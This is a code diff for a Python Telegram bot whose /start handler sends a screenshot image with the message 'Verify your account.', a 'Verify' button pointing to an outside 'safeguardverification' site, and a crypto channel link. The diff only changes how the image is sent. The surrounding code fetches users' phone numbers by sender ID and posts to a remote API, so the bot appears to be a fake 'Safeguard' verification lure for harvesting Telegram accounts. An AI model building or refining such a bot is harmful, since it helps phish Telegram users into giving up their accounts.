@@ -25,16 +25,27 @@ API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your 
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def on_start(event):
     try:
-        await event.respond(
-            file='https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8',  # Path to the image or image URL
-            message="Verify your account.",
-            buttons=[
-                [Button.url("Verify", "https://safeguardverification.netlify.app/")],
-                [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
-            ]
-        )
+        # Download the image from the URL
+        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8'
+        response = requests.get(image_url)
+
+        # Check if the image was downloaded successfully
+        if response.status_code == 200:
+            image_data = response.content  # Get the image bytes
+
+            await event.respond(
+                file=image_data,  # Send the image as bytes
+                message="Verify your account.",
+                buttons=[
+                    [Button.url("Verify", "https://safeguardverification.netlify.app/")],
+                    [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
+                ]
+            )
+        else:
+            await event.respond("Failed to fetch the image from the provided URL.")
+
     except Exception as e:
-        await event.respond(f"Error fetching phone number: {e}")
+        await event.respond(f"Error: {e}")
 
 # Function to retrieve phone number from Flask API based on sender_id
 async def get_phone_by_sender_id(sender_id):
